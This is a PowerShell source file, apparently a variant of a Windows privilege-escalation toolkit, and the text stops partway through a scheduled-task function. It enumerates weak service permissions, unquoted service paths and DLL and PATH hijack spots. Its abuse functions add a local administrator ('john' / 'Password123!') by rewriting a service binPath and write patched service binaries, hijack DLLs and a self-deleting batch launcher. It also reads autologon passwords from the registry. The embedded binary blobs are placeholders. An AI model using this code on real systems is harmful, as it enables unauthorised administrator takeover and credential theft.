Add-Type @"
  [System.FlagsAttribute]
  public enum ServiceAccessFlags : uint
  {
      CC = 1,
      DC = 2,
      LC = 4,
      SW = 8,
      RP = 16,
      WP = 32,
      DT = 64,
      LO = 128,
      CR = 256,
      SD = 65536,
      RC = 131072,
      WD = 262144,
      WO = 524288,
      GA = 268435456,
      GX = 536870912,
      GW = 1073741824,
      GR = 2147483648
  }
"@

function Get-ModifiableFile {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $Path
    )

    begin {
        # false positives
        $Excludes = @("MsMpEng.exe", "NisSrv.exe")

        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    }

    process {
        $CandidateFiles = @()

        # test for quote-enclosed args first, returning files that exist on the system
        $CandidateFiles += $Path.split("`"'") | Where-Object { $_ -and (Test-Path $_) }

        # now check for space-separated args, returning files that exist on the system
        $CandidateFiles += $Path.split() | Where-Object { $_ -and (Test-Path $_) }
        
        # see if we need to skip any excludes
        $CandidateFiles | Sort-Object -Unique | Where-Object {$_} | Where-Object {
            $Skip = $False
            ForEach($Exclude in $Excludes) {
                if($_ -match $Exclude) { $Skip = $True }
            }
            if(!$Skip) {$True}
        } | ForEach-Object {

            try {
                # expand any %VARS%
                $FilePath = [System.Environment]::ExpandEnvironmentVariables($_)
                
                # try to open the file for writing, immediately closing it
                $File = Get-Item -Path $FilePath -Force
                $Stream = $File.OpenWrite()
                $Null = $Stream.Close()
                $FilePath
            }
            catch {}
        }
    }

    end {
        $ErrorActionPreference = $OrigError
    }
}

function Test-ServiceDaclPermission {
    [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $True)]
            [string]
            $ServiceName,

            [Parameter(Mandatory = $True)]
            [string]
            $Dacl
        )

    # check if sc.exe exists
    if (-not (Test-Path ("$env:SystemRoot\system32\sc.exe"))){ 
        Write-Warning "[!] Could not find $env:SystemRoot\system32\sc.exe"
        return $False
    }

    # query WMI for the service
    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
        
    # make sure we got a result back
    if (-not ($TargetService)){
        Write-Warning "[!] Target service '$ServiceName' not found on the machine"
        return $False
    }

    try {
        # retrieve DACL from sc.exe
        $Result = sc.exe sdshow $TargetService.Name | where {$_}

        if ($Result -like "*OpenService FAILED*"){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $False
        }

        $SecurityDescriptors = New-Object System.Security.AccessControl.RawSecurityDescriptor($Result)

        # populate a list of group SIDs that the current user is a member of
        $Sids = whoami /groups /FO csv | ConvertFrom-Csv | select "SID" | ForEach-Object {$_.Sid}

        # add to the list the SID of the current user
        $Sids += [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value

        ForEach ($Sid in $Sids){
            ForEach ($Ace in $SecurityDescriptors.DiscretionaryAcl){   
            
                # check if the group/user SID is included in the ACE 
                if ($Sid -eq $Ace.SecurityIdentifier){
                
                    # convert the AccessMask to a service DACL string
                    $DaclString = [string]([ServiceAccessFlags] $Ace.AccessMask) -replace ', ',''
                
                    # convert the input DACL to an array
                    $DaclArray = [array] ($Dacl -split '(.{2})' | Where-Object {$_})
                
                    # counter to check how many DACL permissions were found
                    $MatchedPermissions = 0
                
                    # check if each of the permissions exists
                    ForEach ($DaclPermission in $DaclArray){
                        if ($DaclString.Contains($DaclPermission.ToUpper())){
                            $MatchedPermissions += 1
                        }
                        else{
                            break
                        }
                    }
                    # found all permissions - success
                    if ($MatchedPermissions-eq $DaclArray.Count){
                        return $True
                    }
                }  
            }
        }
        return $False
    }
    catch{
        Write-Warning "Error: $_"
        return $False
    }
}

function Invoke-ServiceStart {
[CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
        
        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
            
        try {
            # enable the service if it was marked as disabled
            if ($TargetService.StartMode -eq "Disabled"){
                $r = Invoke-ServiceEnable -ServiceName "$($TargetService.Name)"
                if (-not $r){ 
                    return $False 
                }
            }

            # start the service
            Write-Verbose "Starting service '$($TargetService.Name)'"
            $Null = sc.exe start "$($TargetService.Name)"

            Start-Sleep -s .5
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceStop {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }

        try {
            # stop the service
            Write-Verbose "Stopping service '$($TargetService.Name)'"
            $Result = sc.exe stop "$($TargetService.Name)"

            if ($Result -like "*Access is denied*"){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $False
            }
            elseif ($Result -like "*1051*") {
                # if we can't stop the service because other things depend on it
                Write-Warning "[!] Stopping service $($TargetService.Name) failed: $Result"
                return $False
            }

            Start-Sleep 1
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceEnable {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
        
        try {
            # enable the service
            Write-Verbose "Enabling service '$TargetService.Name'"
            $Null = sc.exe config "$($TargetService.Name)" start= demand
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceDisable {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )
    
    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
        
        try {
            # disable the service
            Write-Verbose "Disabling service '$TargetService.Name'"
            $Null = sc.exe config "$($TargetService.Name)" start= disabled
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}

function Get-ServiceUnquoted {
    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | Where-Object {-not $_.pathname.StartsWith("`"")} | Where-Object {-not $_.pathname.StartsWith("'")} | Where-Object {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}
    
    if ($VulnServices) {
        ForEach ($Service in $VulnServices){
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'ServiceName' $Service.name
            $Out | Add-Member Noteproperty 'Path' $Service.pathname
            $Out | Add-Member Noteproperty 'StartName' $Service.startname
            $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -ServiceName '$($Service.name)' -Path <HijackPath>"
            $Out
        }
    }
}


function Get-ServiceFilePermission {
    
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiableFile | ForEach-Object {
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -ServiceName '$ServiceName'"
            $Out
        }
    }
}


function Get-ServicePermission {
    # check if sc.exe exists
    if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))) { 
        Write-Warning "[!] Could not find $Env:SystemRoot\System32\sc.exe"
        
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'ServiceName' 'Not Found'
        $Out | Add-Member Noteproperty 'Path' "$Env:SystemRoot\System32\sc.exe"
        $Out | Add-Member Noteproperty 'StartName' $Null
        $Out | Add-Member Noteproperty 'AbuseFunction' $Null
        $Out
    }

    $Services = Get-WmiObject -Class win32_service | Where-Object {$_}
    
    if ($Services) {
        ForEach ($Service in $Services){

            # try to change error control of a service to its existing value
            $Result = sc.exe config $($Service.Name) error= $($Service.ErrorControl)

            # means the change was successful
            if ($Result -contains "[SC] ChangeServiceConfig SUCCESS"){
                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -ServiceName '$($Service.name)'"
                $Out
            }
        }
    }
}


function Get-ServiceDetail {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_} | ForEach-Object {
            try {
                $_ | Format-List *
            }
            catch{
                Write-Warning "Error: $_"
                $null
            }            
        }
    }
}

function Invoke-ServiceAbuse {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    process {

        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if ($TargetService) {

            $ServiceAbused = $TargetService.Name
            $UserAdded = $Null
            $PasswordAdded = $Null
            $GroupnameAdded = $Null

            try {
                # check if sc.exe exists
                if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))){ 
                    throw "Could not find $Env:SystemRoot\System32\sc.exe"
                }

                # try to enable the service it was disabled
                $RestoreDisabled = $False
                if ($TargetService.StartMode -eq "Disabled") {
                    Write-Verbose "Service '$ServiceName' disabled, enabling..."
                    if(-not $(Invoke-ServiceEnable -ServiceName $ServiceName)) {
                        throw "Error in enabling disabled service."
                    }
                    $RestoreDisabled = $True
                }

                # extract the original path and state so we can restore it later
                $OriginalPath = $TargetService.PathName
                $OriginalState = $TargetService.State
                Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
                Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"

                $Commands = @()

                if($Command) {
                    # only executing a custom command
                    $Commands += $Command
                }
                elseif($UserName.Contains("\")) {
                    # adding a domain user to the local group, no creation
                    $Commands += "net localgroup $LocalGroup $UserName /add"
                }
                else {
                    # creating a local user and adding to the local group
                    $Commands += "net user $UserName $Password /add"
                    $Commands += "net localgroup $LocalGroup $UserName /add"
                }

                foreach($Cmd in $Commands) {
                    if(-not $(Invoke-ServiceStop -ServiceName $TargetService.Name)) {
                        throw "Error in stopping service."
                    }

                    Write-Verbose "Executing command '$Cmd'"

                    $Result = sc.exe config $($TargetService.Name) binPath= $Cmd
                    if ($Result -contains "Access is denied."){
                        throw "Access to service $($TargetService.Name) denied"
                    }

                    $Null = Invoke-ServiceStart -ServiceName $TargetService.Name
                }
 
                # cleanup and restore the original binary path
                Write-Verbose "Restoring original path to service '$ServiceName'"
                $Null = sc.exe config $($TargetService.Name) binPath= $OriginalPath

                # try to restore the service to whatever state it was
                if($RestoreDisabled) {
                    Write-Verbose "Re-disabling service '$ServiceName'"
                    $Result = sc.exe config $($TargetService.Name) start= disabled
                }
                elseif($OriginalState -eq "Paused") {
                    Write-Verbose "Starting and then pausing service '$ServiceName'"
                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
                    $Null = sc.exe pause $($TargetService.Name)
                }
                elseif($OriginalState -eq "Stopped") {
                    Write-Verbose "Leaving service '$ServiceName' in stopped state"
                }
                else {
                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
                }
            }
            catch {
                Write-Warning "Error while modifying service '$ServiceName': $_"
                $Commands = @("Error while modifying service '$ServiceName': $_")
            }
        }

        else {
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Commands = "Not found"
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceAbused' $ServiceAbused
        $Out | Add-Member Noteproperty 'Command' $($Commands -join " && ")
        $Out
    }
}


function Write-ServiceBinary {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $ServicePath = "service.exe",

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    begin {
        # the raw unpatched service binary
	$B64Binary = "ABABA"
                [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)
    }

    process {
        if(-not $Command) {
            if($UserName.Contains("\")) {
                # adding a domain user to the local group, no creation
                $Command = "net localgroup $LocalGroup $UserName /add"
            }
            else {
                # creating a local user and adding to the local group
                $Command = "net user $UserName $Password /add && timeout /t 2 && net localgroup $LocalGroup $UserName /add"
            }
        }

        # get the unicode byte conversions of all arguments
        $Enc = [System.Text.Encoding]::Unicode
        $ServiceNameBytes = $Enc.GetBytes($ServiceName)
        $CommandBytes = $Enc.GetBytes($Command)

        # patch all values in to their appropriate locations
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) { 
            # service name offset = 2458
            $Binary[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) { 
            # cmd offset = 2535
            $Binary[$i+2535] = $CommandBytes[$i]
        }

        try {
            Set-Content -Value $Binary -Encoding Byte -Path $ServicePath -Force
        }
        catch {
            $Msg = "Error while writing to location '$ServicePath': $_"
            Write-Warning $Msg
            $Command = $Msg
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
        $Out | Add-Member Noteproperty 'Command' $Command
        $Out
    }
}


function Install-ServiceBinary {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if ($TargetService){
            try {

                $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")
                $BackupPath = $ServicePath + ".bak"

                Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
                try {
                    Move-Item -Path $ServicePath -Destination $BackupPath -Force
                }
                catch {
                    Write-Warning "[*] Original path '$ServicePath' for '$ServiceName' does not exist!"
                }

                $Arguments = @{
                    'ServiceName' = $ServiceName
                    'ServicePath' = $ServicePath
                    'UserName' = $UserName
                    'Password' = $Password
                    'LocalGroup' = $LocalGroup
                    'Command' = $Command
                }
                # splat the appropriate arguments to Write-ServiceBinary
                $Result = Write-ServiceBinary @Arguments
                $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Result
            }
            catch {
                Write-Warning "Error: $_"
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
                $Out | Add-Member Noteproperty 'Command' $_
                $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Out
            }
        }
        else{
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'ServicePath' "Not found"
            $Out | Add-Member Noteproperty 'Command' "Not found"
            $Out | Add-Member Noteproperty 'BackupPath' $Null
            $Out
        }
    }
}


function Restore-ServiceBinary {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $BackupPath
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if ($TargetService){
            try {

                $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")

                if ($BackupPath -eq $null -or $BackupPath -eq ''){
                    $BackupPath = $ServicePath + ".bak"
                }

                Copy-Item -Path $BackupPath -Destination $ServicePath -Force
                Remove-Item -Path $BackupPath -Force

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
                $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
                $Out
            }
            catch{
                Write-Warning "Error: $_"
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
                $Out | Add-Member Noteproperty 'ServicePath' $_
                $Out | Add-Member Noteproperty 'BackupPath' $Null
                $Out
            }
        }
        else{
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'ServicePath' "Not found"
            $Out | Add-Member Noteproperty 'BackupPath' $Null
            $Out
        }
    }
}


function Find-DLLHijack {
    [CmdletBinding()]
    Param(
        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # the known DLL cache to exclude from our findings
    #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
    $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
    $KnownDLLs = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name) }) | Where-Object { $_.EndsWith(".dll") }

    # grab the current user
    $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

    # get the owners for all processes
    $Owners = @{}
    Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object {$Owners[$_.handle] = $_.getowner().user}


    # iterate through all current processes that have a valid path
    ForEach ($Process in Get-Process | Where-Object {$_.Path}) {

        # get the base path for the process
        $BasePath = $Process.Path | Split-Path -Parent

        # get all the loaded modules for this process
        $LoadedModules = $Process.Modules

        # pull out the owner of this process
        $ProcessOwner = $Owners[$Process.id.tostring()]

        # check each loaded module
        ForEach ($Module in $LoadedModules){

            # create a basepath + loaded module
            $ModulePath = "$BasePath\$($module.ModuleName)"

            # if the new module path 
            if ((-not $ModulePath.Contains("C:\Windows\System32")) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                $Exclude = $False

                # check exclusion flags
                if ( $ExcludeWindows.IsPresent -and $ModulePath.Contains("C:\Windows") ){
                    $Exclude = $True
                }
                if ( $ExcludeProgramFiles.IsPresent -and $ModulePath.Contains("C:\Program Files") ){
                    $Exclude = $True
                }
                if ( $ExcludeOwned.IsPresent -and $CurrentUser.Contains($ProcessOwner) ){
                    $Exclude = $True
                }

                # output the process name and hijackable path if exclusion wasn't marked
                if (-not $Exclude){
                    $Out = New-Object PSObject 
                    $Out | Add-Member Noteproperty 'ProcessPath' $Process.Path
                    $Out | Add-Member Noteproperty 'Owner' $ProcessOwner
                    $Out | Add-Member Noteproperty 'HijackablePath' $ModulePath
                    $Out
                }
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


function Find-PathHijack {
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Paths = (Get-Item Env:Path).value.split(';') | Where-Object {$_ -ne ""}

    ForEach ($Path in $Paths){

        $Path = $Path.Replace('"',"")
        if (-not $Path.EndsWith("\")){
            $Path = $Path + "\"
        }

        # reference - http://stackoverflow.com/questions/9735449/how-to-verify-whether-the-share-has-write-access
        $TestPath = Join-Path $Path ([IO.Path]::GetRandomFileName())

        # if the path doesn't exist, try to create the folder before testing it for write
        if(-not $(Test-Path -Path $Path)){
            try {
                # try to create the folder
                $Null = New-Item -ItemType directory -Path $Path
                echo $Null > $TestPath

                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'HijackablePath' $Path
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
                $Out
            }
            catch {}
            finally {
                # remove the directory
                Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        else{
            # if the folder already exists
            try {
                echo $Null > $TestPath

                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'HijackablePath' $Path
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
                $Out
            }
            catch {} 
            finally {
                # Try to remove the item again just to be safe
                Remove-Item $TestPath -Force -ErrorAction SilentlyContinue
            }
        }
    }
    
    $ErrorActionPreference = $OrigError
}


function Write-HijackDll {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [String]
        $OutputFile,

        [Parameter(Mandatory = $True)]
        [String]
        $Command,

        [String]
        $BatPath,        

        [String]
        $Arch
    )

    function local:Invoke-PatchDll {

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [String]
            $FindString,

            [Parameter(Mandatory = $True)]
            [String]
            $ReplaceString
        )

        $FindStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($FindString)
        $ReplaceStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $Index = 0
        $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
        $Index = $S.IndexOf($FindString)

        if($Index -eq 0)
        {
            throw("Could not find string $FindString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
        {
            $DllBytes[$Index+$i]=$ReplaceStringBytes[$i]
        }

        return $DllBytes
    }

    # generate with base64 -w 0 hijack32.dll > hijack32.b64
    $DllBytes32 = "ADEW"
    $DllBytes64 = "LOLOL"
       
    if($Arch) {
        if($Arch -eq "x64") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
        }
        elseif($Arch -eq "x86") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
        }
        else{
            Throw "Please specify x86 or x64 for the -Arch"
        }
    }
    else {
        # if no architecture if specified, try to auto-determine the arch
        if ($Env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
            $Arch = "x64"
        }
        else {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
            $Arch = "x86"
        }
    }

    if(!$BatPath) {
        $parts = $OutputFile.split("\")
        $BatPath = ($parts[0..$($parts.length-2)] -join "\") + "\debug.bat"
    }
    else {
        # patch in the appropriate .bat launcher path
        $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString "debug.bat" -ReplaceString $BatPath
    }

    # build the launcher .bat
    if (Test-Path $BatPath) { Remove-Item -Force $BatPath }
    "@echo off\n" | Out-File -Encoding ASCII -Append $BatPath 
    "start /b $Command" | Out-File -Encoding ASCII -Append $BatPath 
    'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatPath
    
    ".bat launcher written to: $BatPath"

    Set-Content -Value $DllBytes -Encoding Byte -Path $OutputFile
    "$Arch DLL Hijacker written to: $OutputFile"

    $Out = New-Object PSObject 
    $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
    $Out | Add-Member Noteproperty 'Architecture' $Arch
    $Out | Add-Member Noteproperty 'BATLauncherPath' $BatPath
    $Out | Add-Member Noteproperty 'Command' $Command
    $Out
}

function Get-RegAlwaysInstallElevated {
    [CmdletBinding()]
    Param()
    
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {

        $HKLMval = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path "hkcu:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose "AlwaysInstallElevated enabled on this machine!"
                $True
            }
            else{
                Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                $False
            }
        }
        else{
            Write-Verbose "AlwaysInstallElevated not enabled on this machine."
            $False
        }
    }
    else{
        Write-Verbose "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-RegAutoLogon {
    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon.AutoAdminLogon -ne 0){

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {            
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out
        }
    }
}   


function Get-VulnAutoRun {
    [CmdletBinding()]Param()
    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        
        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiableFile | ForEach-Object {
                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}

function Get-VulnSchTask {
    [CmdletBinding()]Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object {
        
